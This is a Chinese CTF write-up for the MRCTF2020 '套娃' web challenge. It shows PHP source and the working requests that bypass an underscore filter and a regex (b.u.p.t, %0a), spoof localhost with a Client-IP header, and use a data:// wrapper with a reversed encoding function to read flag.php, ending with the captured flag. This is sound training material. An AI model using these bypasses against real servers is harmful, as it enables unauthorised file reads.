# [MRCTF2020]套娃

[题目地址](https://buuoj.cn/challenges#[MRCTF2020]%E5%A5%97%E5%A8%83)

看源代码能找到一段php。

```php
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

[$_SERVER['QUERY_STRING']](https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html)获取url中的查询部分，就是?号（不包含问号）后面的部分。审查代码，第一个if要求查询内容不能包含_号，url编码后的%5f也不行。第二个if语句则是要求get参数b_u_p_t不等于23333，正则又要求值以23333开头和结尾，中间也是23333。

出现了两个自相矛盾的地方。根据第二个if语句可知我们必须传入名叫b_u_p_t的参数，但是这样的话，$_SERVER['QUERY_STRING']就能获取到包含参数名字和值的内容了。由于b_u_p_t包含下划线，第一个if语句就过不去了。以及正则，题目里的正则正常来说只有23333本身能匹配过去，但又不能等于23333。php特性真的太多了，看[wp](https://www.freebuf.com/articles/network/278261.html)又学到了东西。

第一个问题可利用这个php特性解决：

- PHP会将传参中的空格( )、小数点(.)自动替换成下划线

所以我们传`b u p t`或者`b.u.p.t`给php，php获取到的都是`b_u_p_t`。$_GET['b_u_p_t']不会有问题，$_SERVER['QUERY_STRING']获取到的则还是`b u p t`或者`b.u.p.t`，因为它处理的是url。第二个问题在23333结尾加个换行符url编码为%0a 即可绕过。

- http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/?b.u.p.t=23333%0a

```
how smart you are ~

FLAG is in secrettw.php
```

去看看secrettw.php。查看源代码时发现了一堆jsfuck代码，运行得`post me Merak`。意思是用post给Merak参数传任意值。懒得开bp了，chrome console用js发个post。

```js
var url = "http://28401609-7e35-445a-84b7-509187f6de3f.node4.buuoj.cn:81/secrettw.php";

var params = "Merak=a";

var xhr = new XMLHttpRequest();

xhr.open("POST", url, true);

xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"); 

xhr.onload = function (e) {

  if (xhr.readyState === 4) {

    if (xhr.status === 200) {

      console.log(xhr.responseText);

    } else {

      console.error(xhr.statusText);

    }

  }

};

xhr.onerror = function (e) {

  console.error(xhr.statusText);

};

xhr.send(params);
```

获得php代码。

```php
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

getIp这个函数原生php没有，应该是出题人自己写的。X-Forwarded-For不行，Client-IP行。`file_get_contents($_GET['2333']) === 'todat is a happy day'`这段一个伪协议搞定。最后`file_get_contents(change($_GET['file'])); `可以获取到file传入的文件名的值，然而被change函数改过了，需要我们写个逆向函数。

```python
from base64 import b64encode
def unchange(s):
	result=''
	for i in range(len(s)):
		result+=chr(ord(s[i])-i*2)
	print(b64encode(result.encode()))
unchange("flag.php")
#ZmpdYSZmXGI=
```

于是得到了payload。这里我用curl发了，还是懒得开bp。

```
curl 'http://06a4be5a-3abb-474d-a2ee-cc1bc3c96614.node4.buuoj.cn:81/secrettw.php?2333=data:text/plain,todat%20is%20a%20happy%20day&file=ZmpdYSZmXGI=' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: zh-CN,zh;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36' \
  -H 'Client-IP: 127.0.0.1' \
  --compressed \
  --insecure
```

注意curl发送时，`Client-IP`这个字段不能写错且大小写敏感。还有一个很坑的是，冒号前面不能加空格，比如`'Client-IP : 127.0.0.1'`就不行。

## Flag
> flag{450ca1cf-73ae-4418-b087-7dcd6e85d440}